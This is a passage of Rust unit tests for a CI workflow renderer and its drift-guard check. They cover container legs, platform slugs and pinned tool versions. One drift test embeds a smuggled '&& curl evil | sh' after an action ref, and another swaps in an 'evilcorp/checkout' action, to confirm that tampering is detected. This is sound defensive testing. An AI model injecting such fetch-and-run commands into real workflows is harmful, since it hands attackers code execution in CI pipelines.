        // dies in the loader before any test starts. The triple is assembled
        // from the leg's arch and its image's libc, so both axes must appear.
        let workflow = workflow_for("mirror-container-mixed.yml");

        assert!(
            workflow.contains("linux/amd64) OCX_ARCH=x86_64 ;;")
                && workflow.contains("linux/arm64) OCX_ARCH=aarch64 ;;"),
            "both linux architectures must map to an ocx triple, got:\n{workflow}"
        );
        assert!(
            workflow.contains("OCX_TRIPLE=\"${OCX_ARCH}-unknown-linux-${{ matrix.container_libc }}\""),
            "the triple must combine arch with the leg's libc, got:\n{workflow}"
        );
        // Releases ship .tar.gz (dist-workspace.toml sets unix-archive); the
        // .tar.xz spelling 404s and would silently leave the runner's own ocx.
        assert!(
            workflow.contains(&format!(
                "https://github.com/ocx-sh/ocx/releases/download/{OCX_CONTAINER_CLI_TAG}/ocx-${{OCX_TRIPLE}}.tar.gz"
            )),
            "must download the pinned ocx release as .tar.gz, got:\n{workflow}"
        );
    }

    #[test]
    fn every_setup_ocx_step_pins_the_renderer_ocx_version() {
        // The other half of the pin the container legs get from their download
        // URL. A `setup-ocx` step without the `version:` input floats that job
        // to whatever ocx is newest the day the mirror happens to run, so one
        // missed step is enough to have the two halves of a test matrix
        // exercising different binaries. Assert per step, on every generated
        // file — the announce fixture is one of the two rendering all four.
        let dir = tempdir().unwrap();
        render_fixture("mirror-ghcr-announce.yml", dir.path()).expect("announce fixture must render");

        let expected = format!("        with:\n          version: \"{}\"", ocx_cli_version());
        let mut steps = 0;
        for entry in std::fs::read_dir(dir.path().join(".github/workflows")).unwrap() {
            let path = entry.unwrap().path();
            let content = std::fs::read_to_string(&path).unwrap();
            let lines: Vec<&str> = content.lines().collect();
            for (index, line) in lines.iter().enumerate() {
                if !line.contains("uses: ocx-sh/setup-ocx@") {
                    continue;
                }
                steps += 1;
                assert!(
                    lines[index + 1..].join("\n").starts_with(&expected),
                    "{} line {}: setup-ocx must pin the renderer's ocx version, got:\n{}",
                    path.display(),
                    index + 1,
                    lines[index..].join("\n"),
                );
            }
        }
        // 5 in mirror.yml, 1 each in describe / patch / cascade /
        // announce-from-registry / verify-generated.
        assert_eq!(steps, 10, "every generated workflow's setup-ocx steps must be covered");
    }

    #[test]
    fn container_libc_and_shell_follow_the_image_basename() {
        // Alpine is the only musl base in the corpus, and it ships no bash.
        // A registry-qualified reference must classify like its bare form —
        // getting this wrong hands Alpine a gnu ocx and a missing shell.
        let workflow = workflow_for("mirror-container-mixed.yml");

        assert!(
            workflow.contains("container_image: \"docker.io/library/alpine:3.20\"\n            container_libc: \"musl\"\n            docker_platform: \"linux/amd64\"\n            shell: sh\n"),
            "a registry-qualified alpine must still infer musl + sh, got:\n{workflow}"
        );
        assert!(
            workflow.contains(
                "container_image: \"debian:12\"\n            container_libc: \"gnu\"\n            docker_platform: \"linux/amd64\"\n            shell: bash\n"
            ),
            "debian must infer gnu + bash, got:\n{workflow}"
        );
    }

    #[test]
    fn container_ids_match_the_slug_push_looks_junit_files_up_by() {
        // `pipeline push` finds each leg's result at
        // `junit-{V}-{platform_slug}-{container_id}.xml`, computing the id with
        // `spec::image_to_container_id` (dots slugified too). If the renderer
        // names the file differently every container result reads as missing and
        // the run publishes nothing while looking green.
        let workflow = workflow_for("mirror-multi-container.yml");

        for (image, expected) in [
            ("ubuntu:24.04", "ubuntu_24_04"),
            ("alpine:3.20", "alpine_3_20"),
            ("fedora:40", "fedora_40"),
        ] {
            assert_eq!(
                spec::image_to_container_id(image),
                expected,
                "slug contract with pipeline push"
            );
            assert!(
                workflow.contains(&format!("container_id: {expected}\n")),
                "matrix must carry container_id {expected}, got:\n{workflow}"
            );
        }
        assert!(
            workflow.contains(
                "JUNIT_FILE=\"junit/junit-${VERSION}-${{ matrix.platform_slug }}-${{ matrix.container_id }}.xml\""
            ),
            "the JUnit filename must be keyed by container_id, got:\n{workflow}"
        );
    }

    #[test]
    fn a_libc_bearing_platform_key_renders_a_leg_that_can_run() {
        // The gate G-E case. `linux/amd64+libc.musl` is the only way to declare
        // a libc claim, and every part of the leg has to survive it:
        //
        //   * `docker run --platform` and the ocx-triple `case` see the bare
        //     `linux/amd64` — docker rejects the `+libc.musl` spelling outright,
        //     and the `case` used to fall through to `*)` and abort the leg.
        //   * the matrix label and `ocx package test --platform` see the FULL
        //     key, which is what disambiguates the two entries.
        //   * `platform_slug` is the name `pipeline prepare` gave the bundle, so
        //     the leg finds a file that exists.
        let workflow = workflow_for("mirror-container-libc.yml");

        assert!(
            workflow.contains(
                "          - platform: linux/amd64+libc.musl\n            platform_slug: linux_amd64_libc.musl\n"
            ),
            "the matrix label must keep the full key and slug it the way prepare does, got:\n{workflow}"
        );
        assert!(
            workflow.contains(
                "container_image: \"alpine:3.20\"\n            container_libc: \"musl\"\n            docker_platform: \"linux/amd64\"\n"
            ),
            "the docker platform must drop the os.features suffix, got:\n{workflow}"
        );
        // Everything docker parses reads docker_platform; nothing else may.
        assert!(
            workflow.contains("docker run --rm -i --platform \"${{ matrix.docker_platform }}\" \\")
                && workflow.contains("case \"${{ matrix.docker_platform }}\" in"),
            "docker must be handed the feature-stripped platform, got:\n{workflow}"
        );
        // …and the artifact selection still reads the full key.
        assert!(
            workflow.contains("ocx_test package test --platform \"${{ matrix.platform }}\""),
            "`ocx package test` must keep the full platform key, got:\n{workflow}"
        );
    }

    #[test]
    fn the_rendered_slug_is_the_one_prepare_writes_the_bundle_under() {
        // The leg reads `bundles/bundle-{V}-{platform_slug}.tar.xz`, which the
        // workflow flattened out of `pipeline prepare`'s work tree by basename.
        // Two independent slug rules here means the leg reds on a missing
        // bundle, so assert the renderer and prepare agree — for a libc key,
        // where the naive `/`→`_` rule diverges.
        let workflow = workflow_for("mirror-container-libc.yml");
        let parsed: serde_yaml_ng::Value = serde_yaml_ng::from_str(&workflow).expect("parseable workflow");
        let legs = parsed["jobs"]["test"]["strategy"]["matrix"]["include"]
            .as_sequence()
            .expect("matrix include")
            .clone();

        for key in ["linux/amd64+libc.musl", "linux/amd64+libc.glibc"] {
            let rendered = legs
                .iter()
                .find(|leg| leg["platform"].as_str() == Some(key))
                .unwrap_or_else(|| panic!("no leg for {key} in:\n{workflow}"))["platform_slug"]
                .as_str()
                .expect("platform_slug")
                .to_owned();
            let prepared = crate::pipeline::orchestrator::task_dir(
                Path::new("/work"),
                "3.7.0",
                &key.parse::<ocx_lib::oci::Platform>().expect("valid platform"),
            );
            assert_eq!(
                rendered,
                prepared.file_name().unwrap().to_string_lossy(),
                "rendered slug for {key} must equal the basename `pipeline prepare` writes"
            );
        }
    }

    #[test]
    fn container_legs_refuse_a_runner_of_the_wrong_architecture() {
        // No qemu is installed, so an arm64 leg on an x86_64 runner cannot
        // execute the image. Fail with the reason and the fix instead of a bare
        // docker exec-format error minutes into the run.
        let workflow = workflow_for("mirror-container-mixed.yml");

        assert!(
            workflow.contains("RUNNER_ARCH_UNAME=\"$(uname -m)\"")
                && workflow.contains("if [ \"${RUNNER_ARCH_UNAME}\" != \"${OCX_ARCH}\" ]; then"),
            "the prelude must compare the runner's arch to the leg's, got:\n{workflow}"
        );
        assert!(
            workflow.contains("set an arch-matched \\`runner:\\` on this platform"),
            "the error must name the fix, got:\n{workflow}"
        );
    }

    #[test]
    fn native_legs_of_a_mixed_spec_keep_running_on_the_runner() {
        // A spec with containers on linux and none on darwin renders both. The
        // darwin leg carries no container keys, so `${{ matrix.container_image }}`
        // is empty there and the wrapper takes its native branch.
        let workflow = workflow_for("mirror-container-mixed.yml");

        assert!(
            workflow.contains(
                "          - platform: darwin/arm64\n            platform_slug: darwin_arm64\n            runner: macos-latest\n            container_id: _native_\n            shell: bash\n"
            ),
            "the darwin leg must stay native with no container keys, got:\n{workflow}"
        );
        assert!(
            workflow.contains("              else\n                ocx \"$@\"\n              fi"),
            "the wrapper must fall back to the runner's ocx when no image is set, got:\n{workflow}"
        );
    }

    #[test]
    fn a_spec_without_containers_emits_no_container_machinery() {
        // The companion to the golden corpus, named so a regression says why:
        // native specs must not gain a docker prelude or container matrix keys.
        let workflow = workflow_for("mirror-minimal.yml");

        for needle in [
            "docker run",
            "container_image:",
            "container_libc:",
            "docker_platform:",
            "ocx_test",
        ] {
            assert!(
                !workflow.contains(needle),
                "native spec must not render `{needle}`, got:\n{workflow}"
            );
        }
        assert!(
            workflow.contains("container_id: _native_"),
            "native legs keep the _native_ sentinel, got:\n{workflow}"
        );
    }

    #[test]
    fn render_full_platforms_spec_writes_workflow() {
        // §3.3: Fixture mirror-full-platforms.yml — all 6 platforms rendered.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-full-platforms.yml", dir.path());
        match result {
            Ok(()) => {
                let workflow = dir.path().join(".github/workflows/mirror.yml");
                assert!(workflow.exists());
                let content = std::fs::read_to_string(&workflow).unwrap();
                // Per-platform test overrides must be present for windows
                assert!(content.contains("cmake.exe"), "Windows test override must appear");
                assert!(content.contains("smoke.ps1"), "Windows smoke test must appear");
            }
            Err(MirrorError::SpecUsageError(_)) => {
                panic!("full-platforms spec should be valid");
            }
            Err(_) => {}
        }
    }

    #[test]
    fn render_rejects_ocx_install_block_with_usage_error() {
        // §3.3 negative: mirror-rejects-ocx-install.yml → renderer exits 64 (UsageError)
        // before writing any files.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-rejects-ocx-install.yml", dir.path());
        match result {
            Err(MirrorError::SpecUsageError(msg)) => {
                assert!(
                    msg.contains("ocx_install") || msg.contains("release download"),
                    "Error message must mention ocx_install or release download, got: {msg}"
                );
                // No workflow file must have been written
                let workflow = dir.path().join(".github/workflows/mirror.yml");
                assert!(
                    !workflow.exists(),
                    "No workflow must be written when spec is rejected for ocx_install: block"
                );
            }
            Err(MirrorError::SpecInvalid(_)) => {
                // Also acceptable — serde may reject unknown field before validate()
            }
            Ok(()) => panic!("Expected rejection of ocx_install: block, got Ok"),
            Err(e) => panic!("Expected SpecUsageError or SpecInvalid, got: {e}"),
        }
    }

    #[test]
    fn render_r3_discord_url_rejected_before_write() {
        // §3.3 R3 negative: discord URL in webhook_secret → renderer exits 64 before write
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-r3-discord-url.yml", dir.path());
        match result {
            Err(MirrorError::SpecUsageError(msg)) => {
                // R3: must mention URL or webhook
                assert!(
                    msg.to_lowercase().contains("webhook")
                        || msg.to_lowercase().contains("url")
                        || msg.to_lowercase().contains("discord"),
                    "Error must mention webhook/url/discord, got: {msg}"
                );
                let workflow = dir.path().join(".github/workflows/mirror.yml");
                assert!(
                    !workflow.exists(),
                    "No workflow must be written when R3 discord URL is present"
                );
            }
            Err(MirrorError::SpecInvalid(_)) => {
                // Also acceptable if validator catches it at the spec level
            }
            Ok(()) => panic!("Expected rejection of discord URL in webhook_secret"),
            Err(e) => panic!("Expected SpecUsageError/SpecInvalid, got: {e}"),
        }
    }

    // ── §3.4 S4: --check drift detector ───────────────────────────────────

    #[test]
    fn check_mode_exits_zero_on_matching_generated_files() {
        // §3.4: --check after fresh render → exit 0
        // Test: render, then immediately run --check → must succeed.
        let dir = tempdir().unwrap();

        // Copy the spec into the temp dir so generated files land there.
        let spec = install_spec("mirror-minimal.yml", dir.path());

        // First: write mode render
        let write_result = generate(dir.path(), std::slice::from_ref(&spec), false);

        match write_result {
            Ok(()) => {
                // Second: check mode — must return Ok(()) on no drift
                let check_result = generate(dir.path(), &[spec], true);
                assert!(
                    check_result.is_ok(),
                    "check mode after fresh render must exit 0, got: {:?}",
                    check_result.err()
                );
            }
            Err(_) => {
                // Write mode not yet implemented — test will fail with panic (expected)
            }
        }
    }

    #[test]
    fn check_mode_exits_65_on_drift() {
        // §3.4: --check after mutating one line → exit 65 (DataError) with stderr hint
        let dir = tempdir().unwrap();
        let spec = install_spec("mirror-minimal.yml", dir.path());

        // Write mode first
        let write_result = generate(dir.path(), std::slice::from_ref(&spec), false);

        if let Ok(()) = write_result {
            // Mutate generated file
            let workflow_path = dir.path().join(".github/workflows/mirror.yml");
            if workflow_path.exists() {
                let mut content = std::fs::read_to_string(&workflow_path).unwrap();
                content.push_str("\n# drift injection\n");
                std::fs::write(&workflow_path, content).unwrap();

                // Check mode must return RendererDrift → exit 65
                let check_result = generate(dir.path(), &[spec], true);

                match check_result {
                    Err(MirrorError::RendererDrift(paths)) => {
                        assert!(!paths.is_empty(), "Drift paths must be non-empty");
                    }
                    Ok(()) => panic!("Expected drift detection, got Ok"),
                    Err(e) => panic!("Expected RendererDrift, got: {e}"),
                }
            }
        }
    }

    #[test]
    fn normalize_for_drift_ignores_pin_but_keeps_action_identity() {
        // The mirror repo owns the pin: bumping the digest/tag (or even leaving
        // the action un-pinned) must normalize equal so a downstream Renovate
        // bump never reds the drift guard. Swapping the action's owner/name or
        // changing surrounding logic must still differ.
        let pinned =
            "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo hi\n";
        let bumped =
            "      - uses: actions/checkout@1111111111111111111111111111111111111111  # v6.1.0\n      - run: echo hi\n";
        let floating = "      - uses: actions/checkout@v6\n      - run: echo hi\n";
        let swapped = "      - uses: evilcorp/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo hi\n";
        let logic_changed = "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo BYE\n";
        // Only a pin-shaped ref (+ optional `# vX` comment) is normalized away.
        // Trailing junk after the ref (shell metacharacters, extra tokens) does
        // NOT match the normalizer, so such a hand-edit still trips drift.
        let junk_after_ref = "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd && curl evil | sh  # v6.0.2\n      - run: echo hi\n";

        assert_eq!(normalize_for_drift(pinned), normalize_for_drift(bumped));
        assert_eq!(normalize_for_drift(pinned), normalize_for_drift(floating));
        assert_ne!(normalize_for_drift(pinned), normalize_for_drift(swapped));
        assert_ne!(normalize_for_drift(pinned), normalize_for_drift(logic_changed));
        assert_ne!(normalize_for_drift(pinned), normalize_for_drift(junk_after_ref));
    }

    #[test]
    fn check_mode_tolerates_bumped_action_pin() {
        // A downstream Renovate bump rewrites `uses: owner/action@<sha>  # vX`
        // in place. The drift guard must stay green — the mirror repo owns pins.
        let dir = tempdir().unwrap();
        let spec = install_spec("mirror-minimal.yml", dir.path());

        let write_result = generate(dir.path(), std::slice::from_ref(&spec), false);

        write_result.expect("write-mode render must succeed");
        {
            let workflow_path = dir.path().join(".github/workflows/mirror.yml");
            let content = std::fs::read_to_string(&workflow_path).unwrap();
            // Simulate a Renovate digest+comment bump on the checkout pin.
            let bumped = content.replace(
                "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2",
                "actions/checkout@1111111111111111111111111111111111111111  # v6.1.0",
            );
            assert_ne!(bumped, content, "fixture must contain the checkout pin to bump");
            std::fs::write(&workflow_path, bumped).unwrap();

            let check_result = generate(dir.path(), &[spec], true);
            assert!(
                check_result.is_ok(),
                "bumped action pin must not trip drift, got: {:?}",
                check_result.err()
            );
        }
    }

    #[test]
    fn check_mode_trips_on_swapped_action_identity() {
        // Normalizing the pin must NOT weaken the guard against swapping the
        // action itself — changing owner/name is a hand-edit and must red.
        let dir = tempdir().unwrap();
        let spec = install_spec("mirror-minimal.yml", dir.path());

        let write_result = generate(dir.path(), std::slice::from_ref(&spec), false);

        write_result.expect("write-mode render must succeed");
        {
            let workflow_path = dir.path().join(".github/workflows/mirror.yml");
            let content = std::fs::read_to_string(&workflow_path).unwrap();
            let swapped = content.replace("uses: actions/checkout@", "uses: evilcorp/checkout@");
            assert_ne!(swapped, content, "fixture must contain a checkout `uses:` to swap");
            std::fs::write(&workflow_path, swapped).unwrap();

            let check_result = generate(dir.path(), &[spec], true);
            match check_result {
                Err(MirrorError::RendererDrift(paths)) => {
                    assert!(
                        paths.iter().any(|p| p.contains("mirror.yml")),
                        "drift must call out mirror.yml: {paths:?}"
                    );
                }
                Ok(()) => panic!("swapped action identity must trip drift"),
                Err(e) => panic!("expected RendererDrift, got: {e}"),
            }
        }
    }

    #[test]
    fn check_mode_exits_65_on_missing_generated_file() {
        // §3.4: --check with missing generated file → exit 65 with hint
        let dir = tempdir().unwrap();
        let spec = install_spec("mirror-minimal.yml", dir.path());

        // Run check mode without prior render — files don't exist → must detect drift
        let check_result = generate(dir.path(), &[spec], true);

        match check_result {
            Err(MirrorError::RendererDrift(_)) => {
                // Expected: missing file is drift
            }
            Err(MirrorError::TemplateError(_)) => {
                // Also acceptable: renderer may report missing file as I/O failure
            }
            Ok(()) => panic!("Expected drift on missing generated files, got Ok"),
            Err(e) => {
                // Other errors acceptable until implementation lands
                let _ = e;
            }
        }
    }

    #[test]
    fn render_emits_ci_job_url_property_in_test_matrix() {
        // The Discord embed redesign threads per-(V,P,C) html_url links into
        // run-summary.json. The test matrix step computes the matrix-leg URL
        // via `gh api` and embeds it in the JUnit XML as a suite-level
        // `<property name="ci.job.url" ...>`. `pipeline push` reads the
        // property inside `evaluate_junit` and attaches it to
        // `PlatformFailure.job_url`. This pins down that the renderer wires
        // the property into the rendered workflow.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-full-platforms.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/mirror.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("CI_JOB_URL=$(gh api"),
                "rendered workflow must resolve the per-leg job URL via `gh api`"
            );
            assert!(
                content.contains("<property name=\\\"ci.job.url\\\""),
                "rendered workflow must embed ci.job.url as a JUnit suite property"
            );
            assert!(
                !content.contains("name: Record job URL"),
                "old standalone 'Record job URL' step must not be emitted any more"
            );
        }
    }

    // ── describe.yml renderer ──────────────────────────────────────────────

    #[test]
    fn render_minimal_spec_writes_describe_workflow() {
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let describe = dir.path().join(".github/workflows/describe.yml");
            assert!(describe.exists(), "describe.yml must be emitted alongside mirror.yml");
            let content = std::fs::read_to_string(&describe).unwrap();
            assert!(
                content.contains("name: describe"),
                "describe.yml must declare workflow name"
            );
            assert!(
                content.contains("ocx-mirror package pipeline describe"),
                "describe.yml must invoke `ocx-mirror package pipeline describe`"
            );
            assert!(content.contains("CATALOG.md"), "path filter must include CATALOG.md");
            assert!(
                content.contains("logo.*"),
                "path filter must include logo.* (svg/png probe target)"
            );
        }
    }

    #[test]
    fn render_describe_uses_setup_ocx_action() {
        // After the setup-ocx migration the describe workflow no longer
        // installs ocx via `cargo install` from the submodule. It must use
        // the setup-ocx action and invoke `pipeline describe` directly
        // (setup-ocx activates the project toolchain onto PATH).
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let describe_path = dir.path().join(".github/workflows/describe.yml");
            let content = std::fs::read_to_string(&describe_path).unwrap();
            assert!(
                content.contains("uses: ocx-sh/setup-ocx@"),
                "describe workflow must install ocx via the setup-ocx action"
            );
            assert!(
                content.contains("ocx-mirror package pipeline describe"),
                "describe workflow must invoke pipeline describe directly (no `ocx run --`)"
            );
            assert!(
                !content.contains("cargo install --path ocx/crates/ocx_mirror"),
                "describe workflow must not retain the legacy submodule install step"
            );
        }
    }

    #[test]
    fn check_mode_detects_describe_yml_drift() {
        let dir = tempdir().unwrap();
        let spec = install_spec("mirror-minimal.yml", dir.path());

        let write_result = generate(dir.path(), std::slice::from_ref(&spec), false);

        if write_result.is_ok() {
            let describe_path = dir.path().join(".github/workflows/describe.yml");
            assert!(describe_path.exists(), "describe.yml must have been written");
            let mut content = std::fs::read_to_string(&describe_path).unwrap();
            content.push_str("\n# drift injection\n");
            std::fs::write(&describe_path, content).unwrap();

            let check_result = generate(dir.path(), &[spec], true);

            match check_result {
                Err(MirrorError::RendererDrift(paths)) => {
                    assert!(
                        paths.iter().any(|p| p.contains("describe.yml")),
                        "drift must call out describe.yml: {paths:?}"
                    );
                }
                Ok(()) => panic!("expected drift detection for describe.yml mutation"),
                Err(e) => panic!("expected RendererDrift, got: {e}"),
            }
        }
    }

    // ── verify-generated.yml drift-guard renderer ───────────────────────────────

    /// Build a `MirrorSpec` from inline YAML (no fixture file needed).
    fn spec_from_yaml(yaml: &str) -> crate::spec::MirrorSpec {
        serde_yaml_ng::from_str(yaml).expect("inline spec must parse")
    }

    const SHFMT_SPEC: &str = r#"
name: shfmt
target:
  registry: ocx.sh
  repository: shfmt
source:
  type: github_release
  owner: mvdan
  repo: sh
  tag_pattern: "^v(?P<version>\\d+\\.\\d+\\.\\d+)$"
assets:
  linux/amd64:
    - "shfmt_v.*_linux_amd64$"
asset_type:
  type: binary
  name: shfmt
"#;

    #[test]
    fn render_emits_verify_generated_drift_guard() {
        // Default render writes the drift-guard workflow that runs `--check`.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let verify = dir.path().join(".github/workflows/verify-generated.yml");
            assert!(verify.exists(), "verify-generated.yml must be emitted by default");
            let content = std::fs::read_to_string(&verify).unwrap();
            assert!(content.contains("DO NOT EDIT"), "must carry the DO-NOT-EDIT header");
            assert!(
                content.contains("uses: ocx-sh/setup-ocx@"),
                "drift guard must install ocx via the setup-ocx action"
            );
            assert!(
                content.contains("ocx-mirror package pipeline generate ci --check"),
                "drift guard must run `generate ci --check` directly (no `ocx run --`)"
            );
            assert!(
                content.contains("pull_request:"),
                "drift guard must trigger on pull_request"
            );
        }
    }

    #[test]
    fn verify_generated_emitted_by_default_in_render_map() {
        // Field absent → default false → drift guard present in the render map.
        let spec = spec_from_yaml(SHFMT_SPEC);
        let files = render(&[(root_slot(), spec)]);
        assert!(
            files.contains_key(Path::new(".github/workflows/verify-generated.yml")),
            "verify-generated.yml must be in the render map by default"
        );
    }

    #[test]
    fn allow_manual_edits_skips_verify_generated() {
        // Opt-out: `allow_manual_edits: true` drops the drift guard but keeps the
        // two primary generated workflows.
        let spec = spec_from_yaml(&format!("{SHFMT_SPEC}allow_manual_edits: true\n"));
        let files = render(&[(root_slot(), spec)]);
        assert!(
            files.contains_key(Path::new(".github/workflows/mirror.yml")),
            "mirror.yml must still be rendered when opting out"
        );
        assert!(
            files.contains_key(Path::new(".github/workflows/describe.yml")),
            "describe.yml must still be rendered when opting out"
        );
        assert!(
            !files.contains_key(Path::new(".github/workflows/verify-generated.yml")),
            "verify-generated.yml must be skipped when allow_manual_edits is true"
        );
    }

    #[test]
    fn check_mode_detects_verify_generated_drift() {
        // A hand-edit to verify-generated.yml itself must be caught by `--check`.
        let dir = tempdir().unwrap();
        let spec = install_spec("mirror-minimal.yml", dir.path());

        let write_result = generate(dir.path(), std::slice::from_ref(&spec), false);

        if write_result.is_ok() {
            let verify_path = dir.path().join(".github/workflows/verify-generated.yml");
            assert!(verify_path.exists(), "verify-generated.yml must have been written");
            let mut content = std::fs::read_to_string(&verify_path).unwrap();
            content.push_str("\n# drift injection\n");
            std::fs::write(&verify_path, content).unwrap();

            let check_result = generate(dir.path(), &[spec], true);

            match check_result {
                Err(MirrorError::RendererDrift(paths)) => {
                    assert!(
                        paths.iter().any(|p| p.contains("verify-generated.yml")),
                        "drift must call out verify-generated.yml: {paths:?}"
                    );
                }
                Ok(()) => panic!("expected drift detection for verify-generated.yml mutation"),
                Err(e) => panic!("expected RendererDrift, got: {e}"),
            }
        }
    }

    #[test]
    fn verify_generated_template_runs_check_command() {
        let template = super::VERIFY_GENERATED_TEMPLATE;
        assert!(
            template.contains("ocx-mirror package pipeline generate ci --check"),
            "drift-guard template must invoke `generate ci --check`"
        );
        assert!(
            template.contains("DO NOT EDIT"),
            "drift-guard template must carry the DO-NOT-EDIT header"
        );
    }

    // ── §TestEntry union: CI render tests ──────────────────────────────────────

    /// Build a `MirrorSpec` from inline YAML and call `build_matrix` on it.
    fn build_matrix_from_yaml(yaml: &str) -> Vec<MatrixLeg> {
        let spec: crate::spec::MirrorSpec = serde_yaml_ng::from_str(yaml).unwrap();
        build_matrix(&spec)
    }

    #[test]
    fn render_matrix_entries_emits_kind_command() {
        // A spec with `command:` must produce `kind: command` + `command: <value>` in matrix.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/mirror.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("kind: command"),
                "matrix entry for command test must contain 'kind: command'; content:\n{content}"
            );
            assert!(
                content.contains("command: shfmt --version"),
                "matrix entry must contain 'command: shfmt --version'; content:\n{content}"
            );
        }
    }

    #[test]
    fn render_matrix_entries_emits_kind_script() {
        // A spec with `script:` must produce `kind: script` + `script: <path>` in matrix.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-all-test-kinds.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/mirror.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("kind: script"),
                "matrix entry for script test must contain 'kind: script'; content:\n{content}"
            );
            assert!(
                content.contains("script: tests/smoke.star"),
                "matrix entry must contain 'script: tests/smoke.star'; content:\n{content}"
            );
        }
    }

    #[test]
    fn render_matrix_entries_emits_kind_script_inline() {
        // A spec with `script_inline:` must produce `kind: script_inline` with YAML
        // block scalar (`script_inline: |`) in the matrix entry.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-all-test-kinds.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/mirror.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("kind: script_inline"),
                "matrix entry for inline test must contain 'kind: script_inline'; content:\n{content}"
            );
            assert!(
                content.contains("script_inline: |"),
                "inline test payload must use YAML block scalar ('script_inline: |'); content:\n{content}"
            );
        }
    }

    #[test]
    fn render_all_three_kinds_in_single_spec() {
        // All three kinds must co-exist in the same matrix.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-all-test-kinds.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/mirror.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(content.contains("kind: command"), "command kind missing");
            assert!(content.contains("kind: script"), "script kind missing");
            assert!(content.contains("kind: script_inline"), "script_inline kind missing");
        }
    }

    #[test]
    fn shell_loop_branches_on_test_kind() {
        // The generated shell loop must extract TEST_KIND and branch on its
        // value (command / script / script_inline). Native-only after the
        // setup-ocx migration — container path is exercised via the upstream
        // rejection test (`render_rejects_container_legs_with_usage_error`).
        let legs = build_matrix_from_yaml(
            r#"
name: shfmt
target:
  registry: ocx.sh
  repository: shfmt
source:
  type: github_release
  owner: mvdan
  repo: sh
  tag_pattern: "^v(?P<version>\\d+\\.\\d+\\.\\d+)$"
assets:
  linux/amd64:
    - "shfmt_v.*_linux_amd64$"
asset_type:
  type: binary
  name: shfmt
tests:
  - name: version
    command: shfmt --version
  - name: smoke
    script: tests/smoke.star
  - name: inline
    script_inline: |
      ocx_assert(True)
platforms:
  linux/amd64:
    runner: ubuntu-latest
"#,
        );
        let shell_block = render_test_run_steps(&legs);

        // Must extract TEST_KIND.
        assert!(
            shell_block.contains("TEST_KIND=$(echo \"${TESTS_JSON}\" | jq -r \".[$i].kind\")"),
            "shell loop must extract TEST_KIND; block:\n{shell_block}"
        );
        // Must branch on command.
        assert!(
            shell_block.contains("if [ \"${TEST_KIND}\" = \"command\" ]"),
            "shell loop must have command branch; block:\n{shell_block}"
        );
        // Must branch on script.
        assert!(
            shell_block.contains("elif [ \"${TEST_KIND}\" = \"script\" ]"),
            "shell loop must have script branch; block:\n{shell_block}"
        );
        // Must handle script_inline via else branch (includes printf piped to --script -).
        assert!(
            shell_block.contains("--script -"),
            "shell loop must pipe script_inline to --script -; block:\n{shell_block}"
        );
        // Native script: uses --script $TEST_SCRIPT (not -c).
        assert!(
            shell_block.contains("--script \"${TEST_SCRIPT}\""),
            "native script branch must pass --script; block:\n{shell_block}"
        );
        // Every `ocx package test` invocation in the loop is called directly —
        // setup-ocx activates the project toolchain onto PATH for the step.
        assert!(
            shell_block.contains("ocx package test"),
            "every ocx package test invocation must be called directly (no `ocx run --`); block:\n{shell_block}"
        );
        assert!(
            !shell_block.contains("ocx run"),
            "test loop must not wrap `ocx package test` in `ocx run`; block:\n{shell_block}"
        );
        // No leftover docker injection from the previous container shape.
        assert!(
            !shell_block.contains("docker run"),
            "native-only renderer must not emit any `docker run` lines; block:\n{shell_block}"
        );
    }

    // Regression: native jq.exe on Windows runners emits CRLF, so without
    // `tr -d '\r'` after each jq pipeline in the test job the captured
    // `${VERSION}` carried a trailing CR and corrupted bundle paths
    // (e.g. `bundles/bundle-3.10.0\r-windows_amd64.tar.xz`).
    #[test]
    fn workflow_template_strips_cr_after_jq_for_windows_runners() {
        let template = super::WORKFLOW_TEMPLATE;
        assert!(
            template.contains("jq -r '.[].version' | tr -d '\\r'"),
            "test job must strip CR from jq output to survive Git Bash + native jq.exe on Windows"
        );
        assert!(
            template.contains("head -n1 | tr -d '\\r' || true"),
            "CI_JOB_URL capture must strip CR before exporting the URL"
        );
    }

    // ── Per-version platform-set filter in the test loop ──────────────────────

    #[test]
    fn workflow_test_loop_skips_versions_outside_platform_set() {
        // The test loop must skip versions whose declared platform set excludes
        // this matrix leg's platform — fixes the backfill-partial false-red and
        // never re-tests out-of-window / excluded `(V, P)` pairs.
        let template = super::WORKFLOW_TEMPLATE;
        assert!(
            template.contains("select(.version == $v) | .platforms | index($p)"),
            "test loop must membership-check matrix.platform against the version's platform set"
        );
        assert!(
            template.contains("if [ -z \"${IN_SET}\" ]; then"),
            "test loop must `continue` when the platform is not in the version's set"
        );
    }

